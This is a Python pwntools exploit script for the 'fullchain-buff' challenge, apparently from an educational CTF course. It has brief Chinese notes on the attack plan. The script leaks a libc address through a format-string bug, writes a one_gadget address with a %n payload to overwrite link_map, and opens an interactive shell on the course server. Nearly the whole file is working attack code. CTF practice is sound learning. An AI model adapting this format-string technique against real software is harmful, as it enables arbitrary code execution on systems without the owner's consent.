#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

"""
##### **fullchain-buff** #####
基本上都是同個套路，只差在第三步怎麼做
1. leak stack address
2. write fmtstr in global
3. use fsb to overwrite cnt

解法一:
```
0x7f9693b13eb2 <printf+162>    mov    dword ptr [rsp + 4], 0x30
0x7f9693b13eba <printf+170>    call   __vfprintf_internal

0x7f9693b289f9 <__vfprintf_internal+25>    push   rbx
0x7f9693b289fa <__vfprintf_internal+26>    sub    rsp, 0x548
```

所以只要知道 stack 的位址，cnt 還是可以用 fmt 改到

解法二:
透過 rbp chain 蓋 return address
"""

if len(sys.argv) > 1:
    r = remote('edu-ctf.zoolab.org', 30205)

    # leak libc
    r.sendlineafter('global or local > ', 'local')
    r.sendlineafter('read or write > ', 'write%23$p')
    libc = int(r.recvuntil('global or local', drop=True)[-14:], 16) - 0x270b3
    one_shot = libc + 0xe6f31
    """
    0xe6f31: rax == NULL || [rax] == NULL
    """
    info(f"libc: {hex(libc)}")
    info(f"one_shot: {hex(one_shot)}")

    # write one_gadget
    r.sendlineafter(' > ', 'global')
    r.sendlineafter('read or write > ', 'read')
    r.sendlineafter('length > ', '22')
    r.send(b'%688c%42$nAAAAAA' + p64(one_shot)[:6])

    # overwrite link_map
    r.sendlineafter('global or local > ', 'global')
    r.sendlineafter('read or write > ', 'write')
    r.interactive()

else:
    r = process('./fullchain-buff')

    # leak libc
    r.sendlineafter('global or local > ', 'local')
    r.sendlineafter('read or write > ', 'write%23$p')
    libc = int(r.recvuntil('global or local', drop=True)[-14:], 16) - 0x270b3
    one_shot = libc + 0xe6f31
    """
    0xe6f31: rax == NULL || [rax] == NULL
    """
    info(f"libc: {hex(libc)}")
    info(f"one_shot: {hex(one_shot)}")

    # write one_gadget
    r.sendlineafter(' > ', 'global')
    r.sendlineafter('read or write > ', 'read')
    r.sendlineafter('length > ', '22')
    r.send(b'%688c%42$nAAAAAA' + p64(one_shot)[:6])

    # overwrite link_map
    r.sendlineafter('global or local > ', 'global')
    r.sendlineafter('read or write > ', 'write')
    r.interactive()